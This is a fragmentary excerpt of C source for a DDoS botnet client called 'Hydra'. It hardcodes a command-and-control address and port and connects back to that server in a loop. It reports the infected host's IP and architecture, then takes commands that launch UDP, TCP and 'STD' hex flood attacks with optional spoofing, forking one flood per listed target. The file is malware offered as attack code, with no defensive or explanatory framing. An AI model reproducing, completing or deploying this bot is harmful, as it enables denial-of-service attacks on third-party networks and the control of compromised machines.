...
#include <sys/ioctl.h>
#include <net/if.h>
#define Hydra_sz (sizeof(commServer) / sizeof(unsigned char *))
#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12
#define std_packet 1460

unsigned char *commServer[] = {"45.144.178.146:3074"};

int initConnection();
void makeRandomStr(unsigned char *buf, int length);
int sockprintf(int sock, char *formatStr, ...);
char *inet_ntoa(struct in_addr in);
int HydraSock = 0, currentServer = -1, gotIP = 0;
uint32_t *pids;
uint64_t numpids = 0;
...
int recvLine(int socket, unsigned char *buf, int bufsize)
{
        ...
        while(bufsize-- > 1)
        {
                if(recv(HydraSock, &tmpchr, 1, 0) != 1) {
                        *cp = 0x00;
                        return -1;
                }
                *cp++ = tmpchr;
...
void hudp(unsigned char *target, int port, int timeEnd, int packetsize, int pollinterval, int spoofit) {
        struct sockaddr_in dest_addr;
        dest_addr.sin_family = AF_INET;
...
void htcp(unsigned char *target, int port, int timeEnd, int spoofit, unsigned char *flags, int packetsize, int pollinterval) {
        register unsigned int pollRegister;
        pollRegister = pollinterval;
    ...
    void hstdhex(unsigned char *ip, int port, int secs)
    {
    int std_hex;
       ...
       if(!strcmp(argv[0], "TCP"))
        {
                ...
                if(strstr(ip, ",") != NULL)
                {
                        ...
                        while(hi != NULL)
                        {
                                if(!listFork())
                                {
                                        htcp(hi, port, time, spoofed, flags, psize, pollinterval);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                        ...
                        htcp(ip, port, time, spoofed, flags, psize, pollinterval);
                        _exit(0);
                }
        }
            ...
            if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[4]) > 1024 || (argc == 6 && atoi(argv[5]) < 1))
            {
                ...
                if(strstr(ip, ",") != NULL)
                {
                    ...
                    while(hi != NULL)
                    {
                        if(!listFork())
                        {
                            hudp(hi, port, time, packetsize, pollinterval, spoofed);
                            _exit(0);
                        }
                        hi = strtok(NULL, ",");
                    }
                            ...
                            hudp(ip, port, time, packetsize, pollinterval, spoofed);
                            _exit(0);
                       }    
        }
...
int initConnection()
{
        ...
        memset(server, 0, 512);
        if(HydraSock) { close(HydraSock); HydraSock = 0; }
        if(currentServer + 1 == Hydra_sz) currentServer = 0;
        else currentServer++;
        ...
        HydraSock = socket(AF_INET, SOCK_STREAM, 0);

        if(!connectTimeout(HydraSock, server, port, 30)) return 1;
...
int main(int argc, unsigned char *argv[])
{
        ...
        while(1)
        {
                ...
                sockprintf(HydraSock, "\033[0m[\033[1;31mHydra\033[0m][\033[1;31m%s\033[0m]\033[1;31m:\033[0m[\033[1;31m%s\033[0m] \033[1;31m>\033[0m [\033[1;31m%s\033[0m]", inet_ntoa(ourIP), getPortz(), getArch());
                char commBuf[4096];
                int got = 0;
                int i = 0;
                while((got = recvLine(HydraSock, commBuf, 4096)) != -1)
                {
